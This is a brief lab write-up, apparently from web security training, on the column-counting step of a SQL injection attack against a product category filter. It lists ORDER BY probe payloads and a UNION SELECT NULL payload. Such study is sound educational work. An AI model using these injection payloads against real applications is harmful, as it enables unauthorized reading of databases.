## Lab: Determining number of columns 
**Goal:** The application filters products by category. We need to determine the number of columns returned by the query.
* **Analysis Steps:**
  1. **Inject `ORDER BY`:**
     * `' ORDER BY 1--`
     * `' ORDER BY 2--` 
     * `' ORDER BY 3--` 
     * `' ORDER BY 4--`(error)
     -> **Conclusion:** The query returns **3 columns**.
  2. **Verify with `UNION SELECT`:**
     * Payload: `' UNION SELECT NULL, NULL, NULL--`
  
